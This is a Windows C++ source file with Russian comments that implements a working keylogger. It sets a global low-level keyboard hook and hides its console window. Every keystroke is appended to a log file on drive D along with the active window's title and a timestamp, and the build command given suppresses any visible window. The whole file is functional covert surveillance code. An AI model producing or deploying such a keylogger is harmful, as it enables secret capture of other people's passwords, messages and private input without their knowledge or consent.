#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
//g++ main.cpp -static -o program.exe -mwindows
using namespace std;

//Cохранение в файл 
int Save(int key);

//Функция обратного вызова (получает результат хук-функции и срабатывает при нажатии клавишы)
//Возвращает длинное целое, справа налево + стек очищает сама функция

/*int nCode 
Код, определяющий, как обрабатывать сообщение

Может быть одним из следующих:
HC_ACTION (0) - означает, что параметры wParam и lParam содержат информацию о сообщении
Другие коды, зависящие от типа хука (например, для клавиатурных хуков может быть HC_NOREMOVE)

WPARAM wParam
Содержит дополнительную информацию о сообщении

Тип WPARAM - это UINT_PTR (беззнаковое целое, размером с указатель)

Содержимое зависит от типа хука:

Для клавиатурного хука (WH_KEYBOARD): содержит виртуальный код клавиши

LPARAM lParam
Содержит дополнительную информацию о сообщении

Тип LPARAM - это LONG_PTR (знаковое целое, размером с указатель)

Содержимое зависит от типа хука:

Для клавиатурного хука: указатель на структуру KBDLLHOOKSTRUCT
*/
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

//Чтобы определить, какая кнопка нажата и получить её код
KBDLLHOOKSTRUCT kbStruct;

ofstream file;


//extern char prevProg[256];

int Save(int key){
    //Массив для хранения имени открытого окна 
    static char prevProg[256] = {0};

    //клавиши мыши
    if(key == 1 || key == 2){
        return 0;
    }

    //дескриптор для программы, запущенной на переднем плане
    HWND foreground = GetForegroundWindow();

    //id потока
    DWORD threadId;

    //Расладка клавиатуры
    HKL keyboatdLayout;

    if(foreground){
        //Получаем id потока
        threadId = GetWindowThreadProcessId(foreground, NULL);
        //Получаем раскладку
        keyboatdLayout = GetKeyboardLayout(threadId);

        //Получаем имя окна
        char crrProg[256];
        GetWindowTextA(foreground, crrProg, sizeof(crrProg));

        if(strcmp(prevProg, crrProg) != 0){
            strcpy_s(prevProg, crrProg);     
            
            time_t t = time(NULL);

            struct tm * tm = localtime(&t);

            char c[64];

            strftime(c, sizeof(c), "%c", tm);

            int len = MultiByteToWideChar(CP_ACP, 0, crrProg, -1, NULL, 0);
            wchar_t* wstr = new wchar_t[len];
            MultiByteToWideChar(CP_ACP, 0, crrProg, -1, wstr, len);
        
            // Преобразуем из wide char в UTF-8
            int utf8_len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
            char* utf8_str = new char[utf8_len];
            WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, utf8_len, NULL, NULL);

            file << "\n\n\n[Program: " << utf8_str << " Date" << c << "]";

            delete[] wstr;
            delete[] utf8_str;
        }

    }

    cout << key << endl;

    if(key == VK_BACK)
        file << "[BACKSPACE]";
    else if(key == VK_RETURN)
        file << "\n";
    else if(key == VK_SPACE)
        file << " ";
    else if(key == VK_TAB)
        file << "[TAB]";
    else if(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        file << "[SHIFT]";
    else if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        file << "[CTR]";
    else if(key == VK_ESCAPE)
        file << "[ESC]";    
    else if(key == VK_END)
        file << "[END]";  
    else if(key == VK_HOME)
        file << "[HOME]";
    else if(key == VK_LEFT)
        file << "[LEFT]";   
    else if(key == VK_RIGHT)
        file << "[RIGHT]";   
    else if(key == VK_UP)
        file << "[UP]"; 
    else if(key == VK_DOWN)
        file << "[DOWN]";     
    else if(key == 190 || key == 110)
        file << ".";    
    else if(key == 189 || key == 109)
        file << "-";          
    else{
        wchar_t crrKey[2] = {0}; // Массив для символа
        BYTE keyboardState[256]; // Состояние клавиатуры
    
        GetKeyboardState(keyboardState);
    
        // Преобразуем виртуальный код в символ с учетом раскладки
        //1 – максимальное количество символов для записи (обычно 1).
        //0 – флаг (если 0, обычная обработка).
        int result = ToUnicodeEx(key, key, keyboardState, crrKey, 1, 0, keyboatdLayout);
    
        if (result > 0) {
            char utf8_str[8] = {0}; 

            /*
                CP_UTF8 – целевой формат (кодировка UTF-8).
                0 – параметры (по умолчанию).
                crrKey – входная строка (один символ).
                -1 – длина входной строки (автоматически).
                utf8_str – буфер для UTF-8 строки.
                sizeof(utf8_str) – размер буфера (8 байт, достаточно для любого символа UTF-8).
                NULL, NULL – дополнительные параметры (не используются).
            */
            int len = WideCharToMultiByte(CP_UTF8, 0, crrKey, -1, utf8_str, sizeof(utf8_str), NULL, NULL);
    
            if (len > 0) {
                file << utf8_str; // Записываем символ
            }
        }
    }

    file.flush();

    return 0;

}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode >= 0){
        //было ли нажатие кнопки
        if(wParam == WM_KEYDOWN){
            kbStruct = *(KBDLLHOOKSTRUCT*)lParam;

            Save(kbStruct.vkCode);
        }


    }


    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main(){
    //ios_base::app это append
    file.open("D:\\Clientkeylog.txt", ios_base::app | ios_base::binary);

    if (file.tellp() == 0) {
        file << "\xEF\xBB\xBF"; // UTF-8 BOM
    }
    
    //1 - консоль видна, 0 - консоль не видна
    //NULL - заголовок файла не учитывается при поиске
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);


    /*
    NULL - дескриптор модуля (NULL для текущего процесса)
    0 - идентификатор потока (0 для хука на все потоки)
    */
    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))){
        MessageBoxA(NULL, "Someting has gone wrong!", "Error", MB_ICONERROR);
    }

    MSG message;

    while(GetMessage(&message, NULL, 0, 0)){
        //NULL — получать сообщения для всех окон потока

        //0, 0 — без фильтрации по типам сообщений
    }
}